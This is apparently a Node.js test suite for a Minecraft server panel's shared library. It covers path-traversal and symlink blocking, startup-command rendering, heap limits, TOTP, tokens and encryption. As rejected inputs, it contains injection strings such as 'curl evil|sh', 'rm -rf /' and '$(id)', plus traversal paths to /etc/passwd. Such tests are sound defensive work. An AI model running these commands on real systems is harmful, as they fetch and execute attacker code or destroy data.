import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { load, tmpdir } from '../helpers/load.mjs';
const S = await load('packages/shared/src/index.ts');

test('safeResolve blocks path traversal', () => {
  const root = tmpdir(); fs.writeFileSync(path.join(root, 'ok.txt'), 'x');
  assert.equal(S.safeResolve(root, '/ok.txt'), path.join(root, 'ok.txt'));
  assert.equal(S.safeResolve(root, 'a/../ok.txt'), path.join(root, 'ok.txt'));
  for (const bad of ['../etc/passwd', '../../..', '/../x', 'a/../../x', 'dir\\..\\..\\x', 'x\0y']) assert.throws(() => S.safeResolve(root, bad), S.PathSecurityError, bad);
});
test('safeResolve blocks symlink escapes (existing, nested and dangling)', () => {
  const root = tmpdir(); const outside = tmpdir('oghost-outside-'); fs.writeFileSync(path.join(outside, 'secret'), 's');
  fs.symlinkSync(outside, path.join(root, 'link'));
  fs.symlinkSync('/etc/passwd', path.join(root, 'passwd'));
  fs.symlinkSync(path.join(outside, 'nope'), path.join(root, 'dangling'));
  fs.mkdirSync(path.join(root, 'in')); fs.writeFileSync(path.join(root, 'in/f'), 'x'); fs.symlinkSync(path.join(root, 'in'), path.join(root, 'innerlink'));
  assert.throws(() => S.safeResolve(root, 'link/secret'), S.PathSecurityError);
  assert.throws(() => S.safeResolve(root, 'link/new-file'), S.PathSecurityError, 'creating through an escaping symlink');
  assert.throws(() => S.safeResolve(root, 'passwd'), S.PathSecurityError);
  assert.throws(() => S.safeResolve(root, 'dangling'), S.PathSecurityError);
  assert.equal(S.safeResolve(root, 'innerlink/f'), path.join(root, 'innerlink/f'), 'symlinks inside the root are allowed');
});
test('validateHeap never lets Xmx exceed assigned RAM', () => {
  assert.throws(() => S.validateHeap(2048, 512, 4096), /exceeds the server RAM/);
  assert.throws(() => S.validateHeap(2048, 2048, 1024), /Xms cannot be larger/);
  assert.throws(() => S.validateHeap(2048, 10, 1024));
  assert.deepEqual(S.validateHeap(4096, 1024, 3500), []);
  assert.ok(S.validateHeap(4096, 1024, 4000).length > 0, 'warns when no headroom');
  const r = S.recommendedHeap(2048); assert.ok(r.xmxMb < 2048 && r.xmsMb <= r.xmxMb);
});
test('renderStartup produces argv and rejects shell injection', () => {
  const argv = S.renderStartup('{{JAVA}} -Xms{{XMS}}M -Xmx{{XMX}}M -jar {{SERVER_JAR}} nogui', { JAVA: '/usr/bin/java', XMS: 256, XMX: 1024, SERVER_JAR: 'server.jar' });
  assert.deepEqual(argv, ['/usr/bin/java', '-Xms256M', '-Xmx1024M', '-jar', 'server.jar', 'nogui']);
  assert.throws(() => S.renderStartup('java -jar x.jar; rm -rf /', {}), S.StartupError);
  assert.throws(() => S.renderStartup('java -jar {{SERVER_JAR}}', { SERVER_JAR: 'x.jar;curl evil|sh' }), S.StartupError);
  assert.throws(() => S.renderStartup('java $(id)', {}), S.StartupError);
  assert.throws(() => S.renderStartup('java {{UNKNOWN}}', {}), /Unknown startup token/);
});
test('Java requirement by Minecraft version', () => {
  assert.equal(S.requiredJavaFor('1.16.5'), 8); assert.equal(S.requiredJavaFor('1.17.1'), 16); assert.equal(S.requiredJavaFor('1.20.4'), 17);
  assert.equal(S.requiredJavaFor('1.20.5'), 21); assert.equal(S.requiredJavaFor('1.21.4'), 21); assert.equal(S.requiredJavaFor('26.1'), 25); assert.equal(S.requiredJavaFor('latest'), null);
});
test('TOTP (RFC 6238 vector) and window', () => {
  const secret = S.base32Encode(Buffer.from('12345678901234567890'));
  assert.equal(S.totpCode(secret, 59_000).slice(-6), '287082');
  const now = Date.now(); assert.ok(S.verifyTotp(secret, S.totpCode(secret, now)));
  assert.ok(!S.verifyTotp(secret, S.totpCode(secret, now - 10 * 60_000)), 'old code rejected');
});
test('signed short-lived node tokens', async () => {
  const t = S.signToken({ nodeId: 1, serverId: 7 }, 'secret-a', 1);
  assert.equal(S.verifyToken(t, 'secret-a').serverId, 7);
  assert.throws(() => S.verifyToken(t, 'secret-b'));
  const [h, p, sig] = t.split('.');
  const forged = Buffer.from(JSON.stringify({ ...JSON.parse(Buffer.from(p, 'base64url')), serverId: 8 })).toString('base64url');
  assert.throws(() => S.verifyToken([h, forged, sig].join('.'), 'secret-a'), 'tampered payload rejected');
  await new Promise(r => setTimeout(r, 2100)); assert.throws(() => S.verifyToken(t, 'secret-a'), 'expired token rejected');
});
test('secret encryption round-trip and tamper detection', () => {
  const key = 'k'.repeat(43); const blob = S.encryptSecret('refresh-token-123', key);
  assert.notEqual(blob, 'refresh-token-123'); assert.equal(S.decryptSecret(blob, key), 'refresh-token-123');
  const parts = blob.split(':'); const d = Buffer.from(parts[3], 'base64'); d[0] ^= 1; parts[3] = d.toString('base64');
  assert.throws(() => S.decryptSecret(parts.join(':'), key), 'modified ciphertext rejected (GCM auth tag)');
  assert.throws(() => S.decryptSecret(blob, 'x'.repeat(43)));
});
